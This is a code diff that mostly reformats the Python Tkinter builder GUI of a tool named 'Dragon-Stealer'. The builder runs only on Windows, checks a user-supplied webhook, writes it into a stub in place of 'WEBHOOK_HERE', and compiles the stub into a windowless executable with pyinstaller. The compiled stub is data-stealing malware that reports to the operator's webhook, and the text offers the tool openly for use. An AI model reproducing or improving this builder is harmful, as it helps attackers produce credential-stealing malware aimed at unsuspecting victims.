@@ -1,11 +1,13 @@
-import sys
-import tkinter as tk
-import requests
 import codecs
 import os
-import subprocess
 import platform
+import subprocess
+import sys
+import tkinter as tk
 from tkinter import messagebox
+
+import requests
+
 if platform.system() == "Windows":
     # If running on Windows, do nothing and continue with the program
     pass
@@ -13,6 +15,8 @@ else:
     # If not running on Windows, exit the program
     sys.exit()
 subprocess.run("python -m pip install -r requirements.txt", shell=False)
+
+
 def test_webhook():
     webhook_url = webhook_entry.get()
     try:
@@ -26,6 +30,8 @@ def test_webhook():
     except:
         test_webhook_label.config(text="Invalid webhook", fg="#FF0000")
     print(response.status_code)
+
+
 def build():
     search_text = "WEBHOOK_HERE"
     replace_text = webhook_entry.get()
@@ -44,12 +50,13 @@ def build():
             os.system("pyinstaller --onefile --noconsole source/main.py")
             messagebox.showinfo(
                 "Done!",
-                "Stub was successfully built and in a folder called dist."
-            )
+                "Stub was successfully built and in a folder called dist.")
         else:
             messagebox.showerror("Error", "Invalid webhook.")
     except Exception as e:
         tk.messagebox.showerror("Error", f"Error: {str(e)}")
+
+
 root = tk.Tk()
 root.geometry("600x400")
 root.title("Dragon-Stealer")
@@ -79,30 +86,36 @@ test_webhook_label = tk.Label(test_webhook_frame,
 test_webhook_label.pack(side="left", padx=10, pady=10)
 test_webhook_frame.pack(pady=(10, 0))
 button_frame = tk.Frame(root, bg="#2D3142")
-build_button = tk.Button(button_frame,
-                         text="Build",
-                         font=("Arial", 14),
-                         bg="#F5D042",
-                         fg="#2D3142",
-                         activebackground="#F5D042",
-                         activeforeground="#2D3142",
-                         command=build)
-test_button = tk.Button(button_frame,
-                        text="Test Webhook",
-                        font=("Arial", 14),
-                        bg="#F5D042",
-                        fg="#2D3142",
-                        activebackground="#F5D042",
-                        activeforeground="#2D3142",
-                        command=test_webhook)
-star_button = tk.Button(button_frame,
-                        text="Star Our Repo",
-                        font=("Arial", 14),
-                        bg="#F5D042",
-                        fg="#2D3142",
-                        activebackground="#F5D042",
-                        activeforeground="#2D3142",
-                        command=star_repo)
+build_button = tk.Button(
+    button_frame,
+    text="Build",
+    font=("Arial", 14),
+    bg="#F5D042",
+    fg="#2D3142",
+    activebackground="#F5D042",
+    activeforeground="#2D3142",
+    command=build,
+)
+test_button = tk.Button(
+    button_frame,
+    text="Test Webhook",
+    font=("Arial", 14),
+    bg="#F5D042",
+    fg="#2D3142",
+    activebackground="#F5D042",
+    activeforeground="#2D3142",
+    command=test_webhook,
+)
+star_button = tk.Button(
+    button_frame,
+    text="Star Our Repo",
+    font=("Arial", 14),
+    bg="#F5D042",
+    fg="#2D3142",
+    activebackground="#F5D042",
+    activeforeground="#2D3142",
+    command=star_repo,
+)
 build_button.pack(side="left", padx=10, pady=(30, 10))
 test_button.pack(side="left", padx=10, pady=(30, 10))
 star_button.pack(side="left", padx=10, pady=(30, 10))
